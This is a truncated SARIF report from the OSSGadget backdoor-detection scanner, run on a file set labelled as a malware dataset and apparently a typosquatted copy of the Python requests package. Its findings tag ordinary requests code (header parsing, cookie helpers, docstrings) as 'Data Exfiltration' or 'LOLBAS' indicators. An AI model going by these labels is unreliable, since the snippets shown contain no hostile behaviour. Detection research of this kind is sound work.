{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.1.428+ed0e2cfe6a"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 45,
                  "endLine": 932,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                    "rendered": {
                      "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                      "markdown": "`            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 26,
                  "endLine": 932,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                    "rendered": {
                      "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                      "markdown": "`            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 923,
                  "startColumn": 29,
                  "endLine": 923,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    def links(self):\n        \"\"\"Returns the parsed header links of the response, if any.\"\"\"\n\n        header = self.headers.get('link')\n\n        # l = MultiDict()\n        l = {}\n",
                    "rendered": {
                      "text": "    def links(self):\n        \"\"\"Returns the parsed header links of the response, if any.\"\"\"\n\n        header = self.headers.get('link')\n\n        # l = MultiDict()\n        l = {}\n",
                      "markdown": "`    def links(self):\n        \"\"\"Returns the parsed header links of the response, if any.\"\"\"\n\n        header = self.headers.get('link')\n\n        # l = MultiDict()\n        l = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 539,
                  "startColumn": 64,
                  "endLine": 539,
                  "endColumn": 69,
                  "snippet": {
                    "text": "                # If length exists, set it. Otherwise, we fallback\n                # to Transfer-Encoding: chunked.\n                self.headers['Content-Length'] = builtin_str(length)\n        elif self.method not in ('GET', 'HEAD') and self.headers.get('Content-Length') is None:\n            # Set Content-Length to 0 for methods that can have a body\n            # but don't provide one. (i.e. not GET or HEAD)\n            self.headers['Content-Length'] = '0'\n",
                    "rendered": {
                      "text": "                # If length exists, set it. Otherwise, we fallback\n                # to Transfer-Encoding: chunked.\n                self.headers['Content-Length'] = builtin_str(length)\n        elif self.method not in ('GET', 'HEAD') and self.headers.get('Content-Length') is None:\n            # Set Content-Length to 0 for methods that can have a body\n            # but don't provide one. (i.e. not GET or HEAD)\n            self.headers['Content-Length'] = '0'\n",
                      "markdown": "`                # If length exists, set it. Otherwise, we fallback\n                # to Transfer-Encoding: chunked.\n                self.headers['Content-Length'] = builtin_str(length)\n        elif self.method not in ('GET', 'HEAD') and self.headers.get('Content-Length') is None:\n            # Set Content-Length to 0 for methods that can have a body\n            # but don't provide one. (i.e. not GET or HEAD)\n            self.headers['Content-Length'] = '0'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 24,
                  "endLine": 285,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> r = req.prepare()\n      >>> r\n      <PreparedRequest [GET]>\n",
                    "rendered": {
                      "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> r = req.prepare()\n      >>> r\n      <PreparedRequest [GET]>\n",
                      "markdown": "`    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> r = req.prepare()\n      >>> r\n      <PreparedRequest [GET]>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 223,
                  "startColumn": 24,
                  "endLine": 223,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> req.prepare()\n      <PreparedRequest [GET]>\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> req.prepare()\n      <PreparedRequest [GET]>\n    \"\"\"\n",
                      "markdown": "`    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> req.prepare()\n      <PreparedRequest [GET]>\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 78,
                  "endLine": 400,
                  "endColumn": 86,
                  "snippet": {
                    "text": "        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n        if not unicode_is_ascii(host):\n            try:\n                host = self._get_idna_encoded_host(host)\n",
                    "rendered": {
                      "text": "        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n        if not unicode_is_ascii(host):\n            try:\n                host = self._get_idna_encoded_host(host)\n",
                      "markdown": "`        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n        if not unicode_is_ascii(host):\n            try:\n                host = self._get_idna_encoded_host(host)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 397,
                  "startColumn": 55,
                  "endLine": 397,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        if not host:\n            raise InvalidURL(\"Invalid URL %r: No host supplied\" % url)\n\n        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n",
                    "rendered": {
                      "text": "        if not host:\n            raise InvalidURL(\"Invalid URL %r: No host supplied\" % url)\n\n        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n",
                      "markdown": "`        if not host:\n            raise InvalidURL(\"Invalid URL %r: No host supplied\" % url)\n\n        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 854,
                  "startColumn": 49,
                  "endLine": 854,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        The encoding of the response content is determined based solely on HTTP\n        headers, following RFC 2616 to the letter. If you can take advantage of\n        non-HTTP knowledge to make a better guess at the encoding, you should\n        set ``r.encoding`` appropriately before accessing this property.\n        \"\"\"\n\n",
                    "rendered": {
                      "text": "\n        The encoding of the response content is determined based solely on HTTP\n        headers, following RFC 2616 to the letter. If you can take advantage of\n        non-HTTP knowledge to make a better guess at the encoding, you should\n        set ``r.encoding`` appropriately before accessing this property.\n        \"\"\"\n\n",
                      "markdown": "`\n        The encoding of the response content is determined based solely on HTTP\n        headers, following RFC 2616 to the letter. If you can take advantage of\n        non-HTTP knowledge to make a better guess at the encoding, you should\n        set ``r.encoding`` appropriately before accessing this property.\n        \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 15,
                  "endLine": 797,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n        .. note:: This method is not reentrant safe.\n        \"\"\"\n",
                    "rendered": {
                      "text": "    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n        .. note:: This method is not reentrant safe.\n        \"\"\"\n",
                      "markdown": "`    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n        .. note:: This method is not reentrant safe.\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 795,
                  "startColumn": 52,
                  "endLine": 795,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        return chunks\n\n    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n",
                    "rendered": {
                      "text": "        return chunks\n\n    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n",
                      "markdown": "`        return chunks\n\n    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 741,
                  "startColumn": 48,
                  "endLine": 741,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n    def iter_content(self, chunk_size=1, decode_unicode=False):\n        \"\"\"Iterates over the response data.  When stream=True is set on the\n        request, this avoids reading the content at once into memory for\n        large responses.  The chunk size is the number of bytes it should\n        read into memory.  This is not necessarily the length of each item\n        returned as decoding can take place.\n",
                    "rendered": {
                      "text": "\n    def iter_content(self, chunk_size=1, decode_unicode=False):\n        \"\"\"Iterates over the response data.  When stream=True is set on the\n        request, this avoids reading the content at once into memory for\n        large responses.  The chunk size is the number of bytes it should\n        read into memory.  This is not necessarily the length of each item\n        returned as decoding can take place.\n",
                      "markdown": "`\n    def iter_content(self, chunk_size=1, decode_unicode=False):\n        \"\"\"Iterates over the response data.  When stream=True is set on the\n        request, this avoids reading the content at once into memory for\n        large responses.  The chunk size is the number of bytes it should\n        read into memory.  This is not necessarily the length of each item\n        returned as decoding can take place.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 560,
                  "startColumn": 13,
                  "endLine": 560,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            # Allow auth to make its changes.\n            r = auth(self)\n\n            # Update self to reflect the auth changes.\n            self.__dict__.update(r.__dict__)\n\n            # Recompute Content-Length\n",
                    "rendered": {
                      "text": "            # Allow auth to make its changes.\n            r = auth(self)\n\n            # Update self to reflect the auth changes.\n            self.__dict__.update(r.__dict__)\n\n            # Recompute Content-Length\n",
                      "markdown": "`            # Allow auth to make its changes.\n            r = auth(self)\n\n            # Update self to reflect the auth changes.\n            self.__dict__.update(r.__dict__)\n\n            # Recompute Content-Length\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 892,
                  "startColumn": 71,
                  "endLine": 893,
                  "snippet": {
                    "text": "        \"\"\"\n\n        if not self.encoding and self.content and len(self.content) > 3:\n            # No encoding set. JSON RFC 4627 section 3 states we should expect\n            # UTF-8, -16 or -32. Detect which one to use; If the detection or\n            # decoding fails, fall back to `self.text` (using charset_normalizer to make\n            # a best guess).\n            encoding = guess_json_utf(self.content)\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        if not self.encoding and self.content and len(self.content) > 3:\n            # No encoding set. JSON RFC 4627 section 3 states we should expect\n            # UTF-8, -16 or -32. Detect which one to use; If the detection or\n            # decoding fails, fall back to `self.text` (using charset_normalizer to make\n            # a best guess).\n            encoding = guess_json_utf(self.content)\n",
                      "markdown": "`        \"\"\"\n\n        if not self.encoding and self.content and len(self.content) > 3:\n            # No encoding set. JSON RFC 4627 section 3 states we should expect\n            # UTF-8, -16 or -32. Detect which one to use; If the detection or\n            # decoding fails, fall back to `self.text` (using charset_normalizer to make\n            # a best guess).\n            encoding = guess_json_utf(self.content)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 50,
                  "endLine": 643,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n        #: is therefore unaffected by consuming the response content or the\n        #: value of the ``stream`` keyword argument.\n",
                    "rendered": {
                      "text": "\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n        #: is therefore unaffected by consuming the response content or the\n        #: value of the ``stream`` keyword argument.\n",
                      "markdown": "`\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n        #: is therefore unaffected by consuming the response content or the\n        #: value of the ``stream`` keyword argument.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/models.py"
                },
                "region": {
                  "startLine": 641,
                  "startColumn": 24,
                  "endLine": 641,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        #: A CookieJar of Cookies the server sent back.\n        self.cookies = cookiejar_from_dict({})\n\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n",
                    "rendered": {
                      "text": "        #: A CookieJar of Cookies the server sent back.\n        self.cookies = cookiejar_from_dict({})\n\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n",
                      "markdown": "`        #: A CookieJar of Cookies the server sent back.\n        self.cookies = cookiejar_from_dict({})\n\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 86,
                  "endLine": 208,
                  "endColumn": 91,
                  "snippet": {
                    "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                    "rendered": {
                      "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                      "markdown": "`        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 59,
                  "endLine": 208,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                    "rendered": {
                      "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                      "markdown": "`        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 30,
                  "endLine": 143,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get('Cookie')\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n",
                    "rendered": {
                      "text": "    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get('Cookie')\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n",
                      "markdown": "`    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get('Cookie')\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 58,
                  "endLine": 72,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                    "rendered": {
                      "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                      "markdown": "`        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 30,
                  "endLine": 72,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                    "rendered": {
                      "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                      "markdown": "`        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
